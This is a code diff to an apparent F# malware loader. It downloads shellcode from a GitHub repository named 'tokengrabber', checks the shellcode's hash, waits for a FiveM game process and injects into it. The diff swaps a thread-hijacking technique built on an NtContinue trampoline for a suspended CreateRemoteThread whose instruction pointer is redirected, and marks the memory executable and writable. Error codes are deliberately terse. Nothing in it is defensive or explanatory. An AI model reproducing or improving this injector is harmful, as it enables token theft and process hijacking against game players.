@@ -20,6 +20,17 @@ extern nativeint OpenProcess(uint32 dwDesiredAccess, bool bInheritHandle, uint32
 extern nativeint OpenThread(uint32 dwDesiredAccess, bool bInheritHandle, uint32 dwThreadId)
 
 [<DllImport("kernel32.dll", SetLastError = true)>]
+extern nativeint CreateRemoteThread(
+    nativeint hProcess,
+    nativeint lpThreadAttributes,
+    uint32 dwStackSize,
+    nativeint lpStartAddress,
+    nativeint lpParameter,
+    uint32 dwCreationFlags,
+    [<Out>] uint32& lpThreadId
+)
+
+[<DllImport("kernel32.dll", SetLastError = true)>]
 extern uint32 SuspendThread(nativeint hThread)
 
 [<DllImport("kernel32.dll", SetLastError = true)>]
@@ -84,22 +95,21 @@ let THREAD_ACCESS =
     THREAD_SET_CONTEXT ||| THREAD_GET_CONTEXT |||
     THREAD_SUSPEND_RESUME ||| THREAD_QUERY_INFORMATION
 
-let MEM_COMMIT        = 0x1000u
-let MEM_RESERVE       = 0x2000u
-let PAGE_READWRITE    = 0x04u
-let PAGE_EXECUTE_READ = 0x20u
+let MEM_COMMIT             = 0x1000u
+let MEM_RESERVE            = 0x2000u
+let PAGE_READWRITE         = 0x04u
+let PAGE_EXECUTE_READWRITE = 0x40u
 
 let CONTEXT_AMD64 = 0x00100000
 let CONTEXT_FLAGS = CONTEXT_AMD64 ||| 0x1B
 let CONTEXT_SIZE  = 0x4D0
 let CTX_FLAGS_OFF = 0x30
-let CTX_RSP       = 0x98
 let CTX_RIP       = 0xF8
 
 let shellcodeUrl =
-    "https://api.github.com/repos/bielzxdev/tokengrabber/git/blobs/c09eae8c880fdcef98121b47ecbdfee4a91690c2"
+    "https://api.github.com/repos/bielzxdev/tokengrabber/git/blobs/d75c858141c21af6546c906539469adab471e11b"
 
-let expectedSha256 = "ABDA8684E67AE9822C72B8E23193B5117065A944D45B2C7F760CCF15192A5256"
+let expectedSha256 = "6111C02855976DECDDED6B099FA6CC9F10CF8354125865A311D3FADE3F7771FED"
 
 let fiveMFolder =
     Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
@@ -132,7 +142,7 @@ let waitForGame () =
     try
         let mutable found : int option = None
         let mutable i = 0
-        while found.IsNone && i < 120 do
+        while found.IsNone && i < 240 do
             let ps = runningGameProcesses ()
             if ps.Length > 0 then
                 found <- Some ps.[0].Id
@@ -220,111 +230,52 @@ let loadShellcode () =
 
 let injectShellcode (pid: int) (shellcode: byte[]) =
     try
-        let proc = Process.GetProcessById pid
-        let all = proc.Threads |> Seq.cast<ProcessThread> |> Seq.toList
-        if all.IsEmpty then failwith "n6"
-        let chosen =
-            match all |> List.tryFind (fun t -> t.ThreadState = ThreadState.Wait) with
-            | Some t -> t
-            | None -> all.Head
-        let tid = chosen.Id
-
         let hProc = OpenProcess(PROCESS_ACCESS, false, uint32 pid)
         if hProc = 0n then failwith "n7"
 
         let mutable hThread = 0n
-        let mutable pContext = 0n
         let mutable remoteCode = 0n
-        let mutable remoteCtx = 0n
-        let mutable remoteTramp = 0n
         let mutable suspended = false
 
         try
-            hThread <- OpenThread(THREAD_ACCESS, false, uint32 tid)
-            if hThread = 0n then failwith "n8"
-
-            if SuspendThread hThread = UInt32.MaxValue then failwith "n9"
-            suspended <- true
-
-            pContext <- Marshal.AllocHGlobal CONTEXT_SIZE
-            let zeroes = Array.zeroCreate<byte> CONTEXT_SIZE
-            Marshal.Copy(zeroes, 0, pContext, CONTEXT_SIZE)
-            Marshal.WriteInt32(pContext, CTX_FLAGS_OFF, CONTEXT_FLAGS)
-
-            if not (GetThreadContext(hThread, pContext)) then failwith "n10"
-
-            let originalRsp = Marshal.ReadInt64(pContext, CTX_RSP)
-
-            let hNtdll = GetModuleHandleW "ntdll.dll"
-            if hNtdll = 0n then failwith "n11"
-            let pNtContinue = GetProcAddress(hNtdll, "NtContinue")
-            if pNtContinue = 0n then failwith "n12"
-
             let allocSize = (shellcode.Length + 0xFFF) &&& ~~~0xFFF
             remoteCode <- VirtualAllocEx(hProc, 0n, allocSize, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
             if remoteCode = 0n then failwith "n13"
 
-            remoteCtx <- VirtualAllocEx(hProc, 0n, CONTEXT_SIZE, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
-            if remoteCtx = 0n then failwith "n14"
-
-            let trampSize = 0x40
-            remoteTramp <- VirtualAllocEx(hProc, 0n, trampSize, MEM_COMMIT ||| MEM_RESERVE, PAGE_READWRITE)
-            if remoteTramp = 0n then failwith "n15"
-
             let mutable written = 0n
-
-            let ctxBytes = Array.zeroCreate<byte> CONTEXT_SIZE
-            Marshal.Copy(pContext, ctxBytes, 0, CONTEXT_SIZE)
-            if not (WriteProcessMemory(hProc, remoteCtx, ctxBytes, CONTEXT_SIZE, &written)) then failwith "n16"
-
-            let stub = ResizeArray<byte>()
-            let emit8 (v: byte) = stub.Add v
-            let emit64 (v: int64) =
-                for i in 0 .. 7 do
-                    emit8 (byte ((v >>> (8 * i)) &&& 0xFFL))
-            emit8 0x48uy; emit8 0xB9uy; emit64 (remoteCtx.ToInt64())
-            emit8 0x48uy; emit8 0x31uy; emit8 0xD2uy
-            emit8 0x48uy; emit8 0xB8uy; emit64 (pNtContinue.ToInt64())
-            emit8 0xFFuy; emit8 0xD0uy
-            emit8 0xCCuy
-            let trampBytes = stub.ToArray()
-            if not (WriteProcessMemory(hProc, remoteTramp, trampBytes, trampBytes.Length, &written)) then failwith "n17"
-
-            let retOff = stubRetOffset shellcode
-            if shellcode.[retOff] <> 0xC3uy then failwith "n18"
-
-            if not (WriteProcessMemory(hProc, remoteCode, shellcode, shellcode.Length, &written)) then failwith "n19"
+            if not (WriteProcessMemory(hProc, remoteCode, shellcode, shellcode.Length, &written)) then
+                failwith "n19"
 
             let mutable oldProtect = 0u
-            if not (VirtualProtectEx(hProc, remoteCode, allocSize, PAGE_EXECUTE_READ, &oldProtect)) then failwith "n20"
+            if not (VirtualProtectEx(hProc, remoteCode, allocSize, PAGE_EXECUTE_READWRITE, &oldProtect)) then
+                failwith "n20"
 
-            oldProtect <- 0u
-            if not (VirtualProtectEx(hProc, remoteTramp, trampSize, PAGE_EXECUTE_READ, &oldProtect)) then failwith "n21"
+            let hKernel32 = GetModuleHandleW "kernel32.dll"
+            if hKernel32 = 0n then failwith "n29"
+            let pSleep = GetProcAddress(hKernel32, "Sleep")
+            if pSleep = 0n then failwith "n30"
 
-            let callRsp = originalRsp - 8L
-            let frame = BitConverter.GetBytes (remoteTramp.ToInt64())
-            if not (WriteProcessMemory(hProc, nativeint callRsp, frame, frame.Length, &written)) then failwith "n22"
+            let mutable tid = 0u
+            hThread <- CreateRemoteThread(hProc, 0n, 0u, pSleep, 0n, 0x00000004u, &tid)
+            if hThread = 0n then failwith "n8"
+            suspended <- true
 
-            Marshal.WriteInt64(pContext, CTX_RIP, remoteCode.ToInt64())
-            Marshal.WriteInt64(pContext, CTX_RSP, callRsp)
-
-            if not (SetThreadContext(hThread, pContext)) then failwith "n23"
-
-            let pVerify = Marshal.AllocHGlobal CONTEXT_SIZE
+            let pContext = Marshal.AllocHGlobal CONTEXT_SIZE
             try
-                Marshal.Copy(zeroes, 0, pVerify, CONTEXT_SIZE)
-                Marshal.WriteInt32(pVerify, CTX_FLAGS_OFF, CONTEXT_FLAGS)
-                if not (GetThreadContext(hThread, pVerify)) then failwith "n24"
-                if Marshal.ReadInt64(pVerify, CTX_RIP) <> remoteCode.ToInt64() then failwith "n24"
+                let zeroes = Array.zeroCreate<byte> CONTEXT_SIZE
+                Marshal.Copy(zeroes, 0, pContext, CONTEXT_SIZE)
+                Marshal.WriteInt32(pContext, CTX_FLAGS_OFF, CONTEXT_FLAGS)
+                if not (GetThreadContext(hThread, pContext)) then failwith "n10"
+                Marshal.WriteInt64(pContext, CTX_RIP, remoteCode.ToInt64())
+                if not (SetThreadContext(hThread, pContext)) then failwith "n23"
             finally
-                Marshal.FreeHGlobal pVerify
+                Marshal.FreeHGlobal pContext
 
             if ResumeThread hThread = UInt32.MaxValue then failwith "n28"
             suspended <- false
 
         finally
             if suspended && hThread <> 0n then ResumeThread hThread |> ignore
-            if pContext <> 0n then Marshal.FreeHGlobal pContext
             if hThread <> 0n then CloseHandle hThread |> ignore
             if hProc <> 0n then CloseHandle hProc |> ignore
     with
